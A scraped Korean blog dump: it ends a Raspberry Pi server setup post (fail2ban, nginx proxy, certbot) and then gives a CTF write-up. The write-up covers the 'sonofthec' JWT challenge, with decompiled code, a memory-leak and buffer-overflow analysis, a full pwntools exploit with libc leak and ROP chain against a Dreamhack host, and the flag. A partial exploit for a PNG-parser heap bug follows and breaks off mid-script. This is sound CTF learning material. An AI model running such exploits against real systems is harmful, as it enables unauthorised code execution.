this script does nothing. /home/msh/check_eth.sh \u0026amp; # Print the IP address _IP=$(hostname -I) || true if [ \u0026#34;$_IP\u0026#34; ]; then printf \u0026#34;My IP address is %s\\n\u0026#34; \u0026#34;$_IP\u0026#34; fi exit 0 그리고 /etc/rc.local에 등록해주면, 랜선이 꼽혀있는한 eth0 인터페이스만 활성화된다.\nauto reboot \u0026amp; fail2ban 00 00 * * * reboot crontab -e로 넣어준다.\n그리고 sudo apt install fail2ban 해주고\n[DEFAULT] findtime = 1d maxretry = 8 bantime = 3w`` backend = systemd ignoreip = 127.0.0.1/8 192.168.0.0/24 [sshd] enabled = true port = 22 filter = sshd logpath = /var/log/fail2ban-ssh.log /etc/fail2ban/jail.local을 세팅해준다.\nPort fowarding 인터페이스 두개 MAC으로 dhcp ip를 고정시켜준다. 그리고 포트 열어주면 된다.\nCloudflare 그리고 이제 네임서버 바꿔주고 A 레코드 DNS only로 서브도메인도 설정해줬다. 하나는 블로그라 깃허브로 연결되어있고, 서브도메인을 따로 두고 직접 라즈베리파이 서버로 들어가도록 했다.\nSSL \u0026amp; Proxy 개인 nas처럼 쓰려는데 ssl을 자체적으로 지원은 안하는것 같아서 nginx로 프록시해서 ssl을 적용시켰다. 그리고 라즈베리파이4에서 리버스프록시로 라즈베리파이5로도 포워딩하도록 설정했다.\nsudo certbot 이후 서브도메인으로 주면 알아서 설정해준다. /etc/nginx/sites-enabled/* 를 수정해준다.\nserver_name raspi.msh1307.kr; # managed by Certbot location / { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_pass http://127.0.0.1:8080/; # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. #try_files $uri $uri/ =404; } certbot이 자동으로 생성한 부분 조금 지워주고 수정해서 루프백으로 포워딩해주는 부분을 추가한다. 그리고 라즈베리파이5로도 포워딩이 진행되어야하니 설정을 그대로 복사해서 listen만 다른 포트로 지정해주면 된다.\nsudo nginx -t sudo service nginx restart 그리고 crontab에 넣어서 자동으로 인증서를 갱신하게 해줄 수 있다.\n00 02 * * 0 sudo certbot renew --quiet ","permalink":"https://msh1307.kr/blog/raspberry_pi_setup/","summary":"setup raspi-img \u0026amp; switch 평소에 포트포워딩해서 개인 nas겸 CTF시 request bin 같은걸로 잘 쓰고 있었는데, 본딩을 설정하다가 서버가 죽어버렸다. 라즈베리파이 5도 구매해서 4랑 같이 처음부터 밀고 다시 세팅했다. 기존에 WiFi로만 동작하던 서버를 이더넷이 끊켰을때만 WiFi를 사용하도록 바꿨다. cat.5e 랜선을 연결하고 1Gbps를 지원하는 스위칭 허브를 구매하여 연결했다.\n라즈베리파이 pcie 인터페이스에 WD SN770을 연결했는데 제대로 동작하지 않았다. 중국산 500기가 ssd 연결하니 잘 동작해서 usb3.0으로 연결했다. network interface #!/bin/bash if [ -z \u0026#34;$1\u0026#34; ]; then DELAY=\u0026#34;30\u0026#34; else DELAY=\u0026#34;$1\u0026#34; fi sleep $DELAY EthAddr=$(ip addr show eth0 | grep \u0026#34;inet\\b\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | cut -d/ -f1) WiFiAddr=$(ip addr show wlan0 | grep \u0026#34;inet\\b\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | cut -d/ -f1) if [ -z $EthAddr ]; then echo \u0026#34;Using WiFi\u0026#34; echo \u0026#34;wlan0 IP=$WiFiAddr\u0026#34; else echo \u0026#34;Using Ethernet!","title":"Raspberry pi server setup"},{"content":"개인전으로 2위를 했다. 2022, 2023 kaist postech ctf 모든 포너블 챌린지를 해결했고 리버싱 챌린지 하나를 해결했다.\nsonofthec Analysis 인터넷 검색을 통해 enum을 복구한다. methods_fn[0] = (__int64)exit_with_code; methods_fn[1] = (__int64)register; methods_fn[2] = (__int64)login; methods_fn[3] = (__int64)token_status; methods_fn[4] = (__int64)update; methods_fn[5] = (__int64)logout; result = upload; methods_fn[6] = (__int64)upload; json으로 입력을 받고 그에 따른 핸들러를 호출한다.\nread_secret(); args = json_object_object_get(json_obj, \u0026#34;args\u0026#34;); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \u0026#34;username\u0026#34;); chk_string((__int64)STR); object.username = json_object_get_string(STR); usr_name_len = strlen((const char *)object.username); if ( usr_name_len \u0026gt; 0x10 ) exit(0); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \u0026#34;email\u0026#34;); chk_string((__int64)STR); object.email = json_object_get_string(STR); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \u0026#34;Car\u0026#34;); chk_string((__int64)STR); object.Car = json_object_get_string(STR); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \u0026#34;VIN\u0026#34;); chk_string((__int64)STR); object.Vin = json_object_get_string(STR); std::allocator\u0026lt;char\u0026gt;::allocator(vin); new_string(vin_1, (char *)object.Vin); std::allocator\u0026lt;char\u0026gt;::~allocator(); std::string::basic_string((__int64)str, (__int64)vin_1); check_string_length((__int64)str); std::string::~string(str); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \u0026#34;Company\u0026#34;); chk_string((__int64)STR); object.Company = json_object_get_string(STR); v18 = std::chrono::_V2::system_clock::now(STR); initialize( // memleak. 0x10 sz username. (const char *)object.username, (const char *)object.email, (const char *)object.Car, (const char *)object.Vin, (const char *)object.Company); initialize_object(vin); std::allocator\u0026lt;char\u0026gt;::allocator(v15); new_string(dreamhack_string, \u0026#34;Dreamhack\u0026#34;); v3 = setting_iss((__int64)vin, (__int64)dreamhack_string); std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v15[1]); new_string(v33, \u0026#34;JWT\u0026#34;); v4 = setting_typ(v3, (__int64)v33); *(_DWORD *)\u0026amp;v16[8] = 30; sub_115E4(v19, (int *)\u0026amp;v16[8]); v20 = sub_11607((__int64)\u0026amp;v18, (__int64)v19); v5 = setting_exp(v4, (__int64)\u0026amp;v20); std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v15[2]); new_string(usrname, (char *)object.username); set_data(\u0026amp;data, (__int64)usrname); std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v15[3]); // allocator doesnt do anything. just a dummy function new_string(username_string, \u0026#34;username\u0026#34;); v6 = sub_117B0(v5, (__int64)username_string, \u0026amp;data);// v31+8 -\u0026gt; string_ptr std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v15[4]); new_string(a1, (char *)object.email); if ( username ) { v5 = strlen(username); strncpy((char *)ptr, username, v5); } if ( email ) { l = strlen(email); v7 = ptr; v7-\u0026gt;email = (__int64)malloc(l + 1); strcpy((char *)ptr-\u0026gt;email, email); } if ( car ) { l_1 = strlen(car); v9 = ptr; v9-\u0026gt;car = (__int64)malloc(l_1 + 1); strcpy((char *)ptr-\u0026gt;car, car); } if ( vin ) { v10 = strlen(vin); v11 = ptr; v11-\u0026gt;vin = (__int64)malloc(v10 + 1); strcpy((char *)ptr-\u0026gt;vin, vin); } if ( company ) 다음과 같이 여러 필드를 받으며, 이에 따라 JWT 토큰을 발급한다. initialize 함수에서 0x10 size로 검증한다. null terminated가 제대로 이루어지지 않을 수 있다. ptr에 저장된 객체가 참조되며 프린트된다면, memory leak이 발생할 수 있다. Hex-rays 상에선 보이지 않지만, graph view에선 실제로는 c++의 code level exception의 핸들러들도 구현이 되어있다. 만약 exception이 raise되면, exception에 따라 stack unwinding 등의 작업을 수행한다. v3 = json_object_object_get(obj, \u0026#34;args\u0026#34;); v4 = json_object_object_get(v3, \u0026#34;token\u0026#34;); chk_string(v4); if ( !v4 ) exit(-1); token = (char *)json_object_get_string(v4); if ( !token ) exit(-1); std::allocator\u0026lt;char\u0026gt;::allocator((char *)\u0026amp;v2 + 3); new_string(tok, token); std::allocator\u0026lt;char\u0026gt;::~allocator(); std::string::operator=(\u0026amp;current_token, tok); sub_F323((__int64)v7, (__int64)tok); sub_F40E((__int64)v8, (__int64)v7); verify((__int64)v8); // exception can be thrown here sub_F27A((__int64)v8); std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Login success\\n\u0026#34;); sub_F27A((__int64)v7); std::string::~string(tok); return 0LL; jwt token을 입력으로 받아서 로그인을 수행한다.\nstd::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v6); new_string(v12, \u0026#34;Dreamhack\u0026#34;); v2 = sub_11DCE(v1, (__int64)v12); std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v7); new_string(v13, \u0026#34;Dreamhack\u0026#34;); set_data(\u0026amp;v9, (__int64)v13); std::allocator\u0026lt;char\u0026gt;::allocator(v8); new_string(v14, \u0026#34;Company\u0026#34;); v3 = sub_11F76(v2, (__int64)v14, (__int64)\u0026amp;v9); verify_0(v3, rdi0); std::string::~string(v14); std::allocator\u0026lt;char\u0026gt;::~allocator(v8); sub_F350(\u0026amp;v9); std::string::~string(v13); std::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v7); std::string::~string(v12); std::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v6); sub_F370((__int64)v15); std::string::~string(a1); std::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v5); sub_F10A((__int64)v10); priv_flag = 1; // if Exception Thrown, priv_flag = 0 return v16 - __readfsqword(0x28u); } verify 함수에서 priv_flag가 1이 되면 로그인에 성공하게 된다. 이때 JWT 토큰의 Company가 Dreamhack인지를 검증하게 되며, 아니라면 exception이 raise된다.\nv5 = __readfsqword(0x28u); sub_9E62((std::_V2 *)\u0026amp;v3); sub_15EDC(a1, a2, (std::_V2 *)\u0026amp;v3); sub_E470(v3, v4); return v5 - __readfsqword(0x28u); } result = sub_9FB6(\u0026amp;v18); if ( (_BYTE)result ) { v3 = sub_CF54(); v4 = sub_9F24(\u0026amp;v18); if ( (unsigned __int8)sub_9E44(v4, v3) ) { exception = __cxa_allocate_exception(0x20uLL); sub_E2FE(exception, (unsigned int)v18, v19); __cxa_throw(exception, (struct type_info *)\u0026amp;typeinfo for\u0026#39;jwt::error::rsa_exception, sub_26EFC); } v6 = sub_D346(); v7 = sub_9F24(\u0026amp;v18); if ( (unsigned __int8)sub_9E44(v7, v6) ) { v8 = __cxa_allocate_exception(0x20uLL); sub_E348(v8, (unsigned int)v18, v19); __cxa_throw(v8, (struct type_info *)\u0026amp;`typeinfo for\u0026#39;jwt::error::ecdsa_exception, sub_26E9E); } v9 = sub_D78D(); v10 = sub_9F24(\u0026amp;v18); if ( (unsigned __int8)sub_9E44(v10, v9) ) { v11 = __cxa_allocate_exception(0x20uLL); sub_E392(v11, (unsigned int)v18, v19); __cxa_throw(v11, (struct type_info *)\u0026amp;typeinfo for\u0026#39;jwt::error::signature_verification_exception, sub_26FB8); } v12 = sub_DE33(); v13 = sub_9F24(\u0026amp;v18); if ( (unsigned __int8)sub_9E44(v13, v12) ) { v14 = __cxa_allocate_exception(0x20uLL); sub_E3DC(v14, (unsigned int)v18, v19); __cxa_throw(v14, (struct type_info *)\u0026amp;typeinfo for\u0026#39;jwt::error::signature_generation_exception, sub_26F5A); } v15 = sub_E231(); v16 = sub_9F24(\u0026amp;v18); result = sub_9E44(v16, v15); if ( (_BYTE)result ) { v17 = __cxa_allocate_exception(0x20uLL); sub_E426(v17, (unsigned int)v18, v19); __cxa_throw(v17, (struct type_info *)\u0026amp;typeinfo for\u0026#39;jwt::error::token_verification_exception, sub_26E40); } } return result; } 이때도 hex-rays 상에 보이지 않는 핸들러가 존재한다. 이때 priv_flag에 0이 대입된다. token status에서 jwt 토큰을 받고, 그 토큰에 대한 정보를 출력한다.\nExploitation new_string(v15, \u0026#34;Company\u0026#34;); v2 = sub_11F76(v1, (__int64)v15, \u0026amp;v10); verify_0(v2, (__int64)v17); std::string::~string(v15); std::allocator\u0026lt;char\u0026gt;::~allocator(); sub_F350(\u0026amp;v10); std::string::~string(v14); std::allocator\u0026lt;char\u0026gt;::~allocator(); std::string::~string(v13); std::allocator\u0026lt;char\u0026gt;::~allocator(); sub_F370((__int64)v16); std::string::~string(a1); std::allocator\u0026lt;char\u0026gt;::~allocator(); sub_F10A((__int64)v11); sub_120B8(v11, v17); v8 = v11; *(_QWORD *)\u0026amp;v7[3] = sub_12184((__int64)v11); *(_QWORD *)\u0026amp;v10.type = sub_121A2(v8); while ( !sub_121C0(\u0026amp;v7[3], \u0026amp;v10) ) { v9 = (char *)sub_12208(\u0026amp;v7[3]); v3 = std::operator\u0026lt;\u0026lt;\u0026lt;char\u0026gt;(\u0026amp;std::cout, v9); v4 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v3, \u0026#34; = \u0026#34;); v5 = sub_1222D(v4, (data *)v9 + 2); std::ostream::operator\u0026lt;\u0026lt;(v5, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); sub_121E6((__int64)\u0026amp;v7[3]); } sub_F608((__int64)v11); sub_F27A((__int64)v17); 이때 문제는 memory leak은 파싱된 jwt의 body를 기준으로 출력하며, 내부적으로 key, value 형태의 오브젝트로 구현된다. register시에 initialize되어 null terminated string이 아니라, 파싱된 스트링을 jwt 토큰 제작에 이용하므로 memory leak이 절대 불가능하다. 하지만 Exception이 발생했을때 복구 로직에 구현 오류가 존재한다. exception 복구 로직은 진한 초록색으로 하이라이팅되어있는 부분이다. 이때 ptr이 참조되면서 복구 로직이 수행된다. 구현이 가용성에 초점이 맞춰져있어서 exception이 thrown되어도 정상처리를 가능케 해준다. 이를 악용하기 위해서는 JWT 토큰을 검증 시각에 invalidate하게 만들 필요가 있다.\nclock = std::chrono::_V2::system_clock::now(STR); ... new_string(v33, \u0026#34;JWT\u0026#34;); v4 = setting_typ(v3, (__int64)v33); *(_DWORD *)\u0026amp;v16[8] = 30; sub_115E4(v19, (int *)\u0026amp;v16[8]); v20 = sub_11607((__int64)\u0026amp;clock, (__int64)v19); v5 = setting_exp(v4, (__int64)\u0026amp;v20); v4 = *a1; v2 = ret_a1_1(\u0026amp;v4); copy_obj(v5, a2); v6 = v2 + ret_a1_1(v5); set_result(v7, \u0026amp;v6); return v7[0]; 마침 expire time이 30초이므로 그 시간을 sleep하고 token을 검증하면 invalidate 시킬 수 있고, 복구 로직에 의해서 memory가 leak된다.\nv5 = json_object_object_get(a1, \u0026#34;args\u0026#34;); v6 = json_object_object_get(v5, \u0026#34;idx\u0026#34;); if ( !v6 ) exit(-1); data = json_object_object_get(v5, \u0026#34;data\u0026#34;); v3 = ((__int64 (__fastcall *)(__int64))json_object_array_length)(v6); data_len = ((__int64 (__fastcall *)(__int64))json_object_array_length)(data); if ( v3 \u0026gt; 0x10 ) exit(-1); for ( i = 0; data_len \u0026gt; i; ++i ) { idx = json_object_array_get_idx(data, (int)i); if ( (unsigned int)((__int64 (__fastcall *)())json_object_get_type)() == json_type_int ) v9[i] = json_object_get_int64(idx); } bof가 있으니 rip control도 가능하다. canary는 int가 아닐때 write가 안되니 우회할 수 있다.\nExploit script from pwn import * import json sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) rvu = lambda x : p.recvuntil(x) sl = lambda x : p.sendline(x) rvl = lambda : p.recvline() def dump(object): ret = b\u0026#39;{\u0026#39; l = len(object.keys()) i = 0 for it in object.keys(): if isinstance(object[it],dict): ret += b\u0026#39;\u0026#34;\u0026#39; if isinstance(it, bytes): ret += it elif isinstance(it, str): ret += it.encode() else: raise Exception(\u0026#39;unsupported type\u0026#39;) ret += b\u0026#39;\u0026#34; : \u0026#39; ret += dump(object[it]) elif isinstance(object[it],bytes) or isinstance(object[it],str): ret += b\u0026#39;\u0026#34;\u0026#39; if not isinstance(it, bytes): ret += it.encode() elif isinstance(it, str): ret += it else: raise Exception(\u0026#39;unsupported type\u0026#39;) ret += b\u0026#39;\u0026#34; : \u0026#34;\u0026#39; if isinstance(object[it],bytes): ret += object[it] else: ret += object[it].encode() ret += b\u0026#39;\u0026#34;\u0026#39; elif isinstance(object[it],int): ret += b\u0026#39;\u0026#34;\u0026#39; if not isinstance(it, bytes): ret += it.encode() elif isinstance(it, str): ret += it else: raise Exception(\u0026#39;unsupported type\u0026#39;) ret += b\u0026#39;\u0026#34; : \u0026#34;\u0026#39; + str(object[it]).encode() + b\u0026#39;\u0026#34;\u0026#39; elif isinstance(object[it],list): ret += b\u0026#39;\u0026#34;\u0026#39; if not isinstance(it, bytes): ret += it.encode() elif isinstance(it, str): ret += it else: raise Exception(\u0026#39;unsupported type\u0026#39;) val = b\u0026#39;[\u0026#39; for k in object[it]: if isinstance(k, int): val += str(k).encode() + b\u0026#39;,\u0026#39; elif isinstance(k, str): val += b\u0026#39;\u0026#34;\u0026#39; + k.encode() + b\u0026#39;\u0026#34;,\u0026#39; else: raise Exception(\u0026#39;unsupported type\u0026#39;) val = val[:-1] val += b\u0026#39;]\u0026#39; ret += b\u0026#39;\u0026#34; : \u0026#39; + val else: raise Exception(\u0026#39;unsupported type\u0026#39;) i += 1 if i != l: ret += b\u0026#39;,\u0026#39; ret += b\u0026#39;}\u0026#39; return ret def register(username, email, car, vin, company): a = { \u0026#39;header\u0026#39;:{ \u0026#39;method\u0026#39;:\u0026#39;register\u0026#39; }, \u0026#39;args\u0026#39;:{ \u0026#39;username\u0026#39;:username, \u0026#39;email\u0026#39;:email, \u0026#39;Car\u0026#39;:car, \u0026#39;VIN\u0026#39;:vin, \u0026#39;Company\u0026#39;:company, }, } # max vin 0x11,username 0x10 payload = dump(a) return payload def login(token): a = { \u0026#39;header\u0026#39;:{ \u0026#39;method\u0026#39;:\u0026#39;login\u0026#39; }, \u0026#39;args\u0026#39; : { \u0026#39;token\u0026#39; : token } } payload = dump(a) return payload def token_status(): a = { \u0026#39;header\u0026#39;:{ \u0026#39;method\u0026#39;:\u0026#39;token_status\u0026#39; }, } payload = dump(a) return payload def play(): a = { \u0026#39;header\u0026#39;:{ \u0026#39;method\u0026#39;:\u0026#39;play\u0026#39; }, } payload = dump(a) return payload def logout(token): a = { \u0026#39;header\u0026#39;:{ \u0026#39;method\u0026#39;:\u0026#39;logout\u0026#39; }, \u0026#39;args\u0026#39;:{ \u0026#39;token\u0026#39; : token } } payload = dump(a) return payload def update(): a = { \u0026#39;header\u0026#39;:{ \u0026#39;method\u0026#39;:\u0026#39;logout\u0026#39; }, \u0026#39;args\u0026#39;:{ \u0026#39;token\u0026#39; : token } } payload = dump(a) return payload def upload(data : list): a = { \u0026#39;header\u0026#39;:{ \u0026#39;method\u0026#39;:\u0026#39;upload\u0026#39; }, \u0026#39;args\u0026#39;:{ \u0026#39;idx\u0026#39;:[1,2,3], \u0026#39;data\u0026#39;: data } } payload = dump(a) return payload if __name__ == \u0026#39;__main__\u0026#39;: # p = process(\u0026#39;./sonofthec\u0026#39;,env={\u0026#39;LD_PRELOAD\u0026#39;:\u0026#39;./libc.so.6\u0026#39;}) p = remote(\u0026#39;host3.dreamhack.games\u0026#39;,8303) payload = register(b\u0026#39;A\u0026#39;*0x10,b\u0026#39;asdf\u0026#39;,b\u0026#39;morning\u0026#39;,b\u0026#39;A\u0026#39;*0x11,b\u0026#39;Dreamhack\u0026#39;) # if company is not Dreamhack exception raised. print(payload) # pause() sl(payload) rv = json.loads(rvl()[:-1]) tok = rv[\u0026#39;token\u0026#39;] payload = register(b\u0026#39;A\u0026#39;*0x10,b\u0026#39;asdf\u0026#39;,b\u0026#39;morning\u0026#39;,b\u0026#39;A\u0026#39;*0x11,b\u0026#39;Dreamhack\u0026#39;) sl(payload) rv = json.loads(rvl()[:-1]) tok = rv[\u0026#39;token\u0026#39;] payload = register(b\u0026#39;A\u0026#39;*0x8,b\u0026#39;asdf\u0026#39;,b\u0026#39;morning\u0026#39;,b\u0026#39;A\u0026#39;*0x11,b\u0026#39;Dreamhack\u0026#39;) sl(payload) rv = json.loads(rvl()[:-1]) tok = rv[\u0026#39;token\u0026#39;] payload = login(tok) print(payload) sl(payload) \\#leak success(\u0026#34;sleeping 30s\u0026#34;) sleep(30) success(\u0026#39;now token is expired memleak.\u0026#39;) payload = token_status() context.log_level=\u0026#39;debug\u0026#39; sl(payload) rvu(b\u0026#39;A\u0026#39;*8) libc_base = u64(rvl()[:-1].ljust(8,b\u0026#39;\\x00\u0026#39;)) - 0x219df0 success(hex(libc_base)) # exp time = 30sec, so exception will be raised after 30s # if exception is thrown while proccessing JWT token validation, it traps and use ptr, a global variable to print things out so that they can print out some memory. # because this program frequently allocates mem and free, there\u0026#39;s freed chunk in unsorted bin, once i reclaim it, i can get libc_base. payload = [1]*0x11 + [\u0026#34;1\u0026#34;] + [1]+ [libc_base + 0x000000000002a3e5, libc_base + 0x1d8698, libc_base + 0x0000000000029cd6,libc_base + 0x000000000050d60] payload = upload(payload) print(payload) pause() sl(payload) p.interactive() # 0000C139\t.plt.sec:___cxa_throw+4\tbnd jmp cs:__cxa_throw_ptr\tRAX=000055EBCC696A48 RDX=000055EBCC683FB8 RSI=000055EBCC696A48 RDI=000055EBCDE23EE0 # KAPO{js0n_C_w1th_jwt_t0ken_hs_256} online stego Analysis @app.route(\u0026#39;/encode\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def post_encode(): if \u0026#39;png\u0026#39; not in request.files: abort(400) if \u0026#39;msg\u0026#39; not in request.form: abort(400) png = request.files[\u0026#39;png\u0026#39;] msg = request.form[\u0026#39;msg\u0026#39;] if not validate_extension(png.filename): abort(400) filename = os.urandom(32).hex() + \u0026#39;.png\u0026#39; png.save(os.path.join(app.config[\u0026#39;UPLOAD_DIR\u0026#39;], filename)) result = subprocess.check_output([STEGO_PATH, \u0026#39;-e\u0026#39;, \u0026#39;-f\u0026#39;, app.config[\u0026#39;UPLOAD_DIR\u0026#39;] + \u0026#39;/\u0026#39; + filename, \u0026#39;-m\u0026#39;, msg]) return render_template(\u0026#39;encode_result.html\u0026#39;, href=f\u0026#39;{result.decode()}\u0026#39;) @app.route(\u0026#39;/uploads/\u0026lt;path:filename\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def get_uploads(filename): return send_from_directory(UPLOAD_DIR, filename) @app.route(\u0026#39;/decode\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def get_decode(): return render_template(\u0026#39;decode.html\u0026#39;) @app.route(\u0026#39;/decode\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def post_decode(): if \u0026#39;png\u0026#39; not in request.files: abort(400) png = request.files[\u0026#39;png\u0026#39;] if not validate_extension(png.filename): abort(400) filename = os.urandom(32).hex() + \u0026#39;.png\u0026#39; png.save(os.path.join(app.config[\u0026#39;UPLOAD_DIR\u0026#39;], filename)) result = subprocess.check_output([STEGO_PATH, \u0026#39;-d\u0026#39;, \u0026#39;-f\u0026#39;, app.config[\u0026#39;UPLOAD_DIR\u0026#39;] + \u0026#39;/\u0026#39; + filename]) return render_template(\u0026#39;decode_result.html\u0026#39;, msg=f\u0026#39;{result.decode()}\u0026#39;) 그냥 바이너리를 실행해서 출력한다.\n#!/bin/bash sysctl kernel.randomize_va_space=0 su chall -c \u0026#34;export LC_ALL=C.UTF-8; export LANG=C.UTF-8; /bin/sh -c \u0026#39;while true; do flask run -h 0.0.0.0 ; done\u0026#39;\u0026#34; aslr이 꺼져있다.\nif ( de_flag != 2 ) { if ( de_flag == 1 ) decode(filename); fwrite(\u0026#34;Error: Please specify either -d(decoding mode) or -e(encoding mode) option.\\n\u0026#34;, 1uLL, 0x4CuLL, stderr); exit(1); } encode(filename, message_content); return 0LL; png의 청크를 파싱하고, 메세지를 숨기거나 해독할 수 있다.\nstream = fopen(filename, \u0026#34;r\u0026#34;); ... v8 = fread(sig, 1uLL, 8uLL, stream); ... ihdr = parse_chunk(stream); if ( memcmp(\u0026amp;ihdr-\u0026gt;type, \u0026#34;IHDR\u0026#34;, 4uLL) ) { fwrite(\u0026#34;Error: chunk type mismatched\\n\u0026#34;, 1uLL, 0x1DuLL, stderr); exit(1); } master_node = set_node((__int64)ihdr); do { ihdr = parse_chunk(stream); v5 = set_node((__int64)ihdr); set_link(master_node, v5); // circular doubly linked } while ( memcmp(\u0026amp;ihdr-\u0026gt;type, \u0026#34;IEND\u0026#34;, 4uLL) ); // scan while IEND v4 = ftell(stream); fseek(stream, 0LL, 2); v1 = ftell(stream); if ( v4 != v1 ) { fwrite(\u0026#34;Error: wrong footer\\n\u0026#34;, 1uLL, 0x14uLL, stderr); exit(1); 다음과 같이 청크를 파싱한다. parsechunk 함수는 다음과 같다.\nv8 = (chunk *)malloc(0x20uLL); read = fread(\u0026amp;sz, 1uLL, 4uLL, a1); ... sz = conv_big2little(sz); read = fread(\u0026amp;tpye, 1uLL, 4uLL, a1); ... mem = malloc((unsigned __int16)sz); if ( !mem ) { fwrite(\u0026#34;Error: malloc()\\n\u0026#34;, 1uLL, 0x10uLL, stderr); exit(1); } read = fread(mem, 1uLL, sz, a1); ... read = fread(\u0026amp;crc, 1uLL, 4uLL, a1); if ( read \u0026lt;= 3 ) { fwrite(\u0026#34;Error: fread()\\n\u0026#34;, 1uLL, 0xFuLL, stderr); exit(1); } crc = conv_big2little(crc); v5 = crc32(0xFFFFFFFF, (__int64)\u0026amp;tpye, 4u); v5 = ~(unsigned int)crc32(v5, (__int64)mem, sz); if ( v5 != crc ) { fwrite(\u0026#34;Error: crc mismatched\\n\u0026#34;, 1uLL, 0x16uLL, stderr); exit(1); } v8-\u0026gt;length = sz; v8-\u0026gt;type = tpye; v8-\u0026gt;payload = (__int64)mem; v8-\u0026gt;crc = crc; return v8; heap overflow가 발생한다.\nnode *__fastcall set_link(node *master_node, node *new_node) { node *result; // rax node *fd; // [rsp+18h] [rbp-8h] fd = master_node-\u0026gt;fd; fd-\u0026gt;bk = new_node; master_node-\u0026gt;fd = new_node; new_node-\u0026gt;bk = master_node; result = new_node; new_node-\u0026gt;fd = fd; return result; } 이런식으로 circular doubly linked list로 연결되어있다.\nfor ( master_node = (node *)parse(a1); ; pop(master_node) ) { node = get_current_node(master_node); l_ptr = (uint *)\u0026amp;node-\u0026gt;length; if ( !memcmp(\u0026amp;node-\u0026gt;type, \u0026#34;iTXt\u0026#34;, 4uLL) \u0026amp;\u0026amp; !memcmp(\u0026amp;node-\u0026gt;payload-\u0026gt;hdr, secret_hdr, 4uLL) ) break; } if ( *l_ptr \u0026lt;= 8 ) { fwrite(\u0026#34;Error: unable to decode\\n\u0026#34;, 1uLL, 0x18uLL, stderr); exit(1); } secret_msg_length = *l_ptr - 8; p_secret_msg = \u0026amp;node-\u0026gt;payload-\u0026gt;secret_msg; malloc(2 * (__int16)*l_ptr); // sign extension if ( v2 ) // uninitiaized stack var iTXt에 메세지를 암호화하고, decode는 iTXt에서 메세지를 해독한다.\nprev = master_node-\u0026gt;fd; cur = master_node-\u0026gt;fd-\u0026gt;fd; // real current node next = cur-\u0026gt;fd; next-\u0026gt;bk = master_node-\u0026gt;fd; prev-\u0026gt;fd = next; free(cur-\u0026gt;payload); free(cur); 노드를 unlink하는데, 약간 이상하다. masternode→fd→fd로 돌게된다.\nfor ( master_node = (node *)parse(a1); ; pop(master_node) ) { node = get_current_node(master_node); l_ptr = (uint *)\u0026amp;node-\u0026gt;length; if ( !memcmp(\u0026amp;node-\u0026gt;type, \u0026#34;iTXt\u0026#34;, 4uLL) \u0026amp;\u0026amp; !memcmp(\u0026amp;node-\u0026gt;payload-\u0026gt;hdr, secret_hdr, 4uLL) ) break; } Exploitation 루프를 돌면서 로직 버그가 발생하며, free되면서 chunk_payload + 0x0에는 next freed 청크가 들어가기 때문에, 유저가 다음 노드를 조작할 수 있게 된다. 노드가 적다면, DFB를 트리거할 수 있지만, glibc 2.27의 검증 때문에 불가하다. 노드를 너무 늘리면 결국 singly linked list 형태로 bin에 쌓여서 NULL로 끝나게 되고, 순회하기 충분치 않아 null pointer dereference가 발생하여 DOS로 끝난다. 처음부터 top chunk를 덮으면 원하는 메모리 할당이 가능해진다.\nmalloc(2 * (__int16)*l_ptr); // sign extension if ( v2 ) // uninitiaized stack var s = (sec_msg_hdr *)v2; else s = node-\u0026gt;payload; r = (char *)malloc(4uLL); if ( !r ) { fwrite(\u0026#34;Error: malloc()\\n\u0026#34;, 1uLL, 0x10uLL, stderr); exit(1); } *(_DWORD *)r = *(_DWORD *)node-\u0026gt;payload; recover(s-\u0026gt;msg, r, (char *)p_secret_msg, secret_msg_length); 이후 해독을 진행한다.\nExploit script from pwn import * def calc_crc(chunk:bytes) -\u0026gt; int: sz = u32(chunk[:4],endian=\u0026#39;big\u0026#39;) def crc(init : int , asdf : bytes, l : int): v3 = 0 for i in range(l): init ^= asdf[i] for j in range(8): if (init \u0026amp; 1): v3 = 0xEDB88320 else: v3 = 0 init = (init\u0026gt;\u0026gt;1) ^ v3 return init v5 = crc(0xffffffff, chunk[4:8], 4) v5 = ~(crc(v5, chunk[8:],sz)) return v5 def gen_chunk(data_length, type : bytes, data : bytes): payload = b\u0026#39;\u0026#39; payload += p32(data_length,endian=\u0026#39;big\u0026#39;) payload += type payload += data crc = calc_crc(payload) \u0026amp; 0xffffffff payload += p32(crc,endian=\u0026#39;big\u0026#39;) return payload # (a1 \u0026gt;\u0026gt; 8) \u0026amp; 0xFF00 | (a1 \u0026lt;\u0026lt; 8) \u0026amp; 0xFF0000 | (a1 \u0026lt;\u0026lt; 24) | HIBYTE(a1); # a1[2]\u0026gt;\u0026gt;8 | a[1]\u0026lt;\u0026lt;8 | a1[0] \u0026lt;\u0026lt; 24 | a[3] \u0026gt;\u0026gt; 24 # because chunks are linked as a circular doubly linked list, with enough freed chunks u can trigger 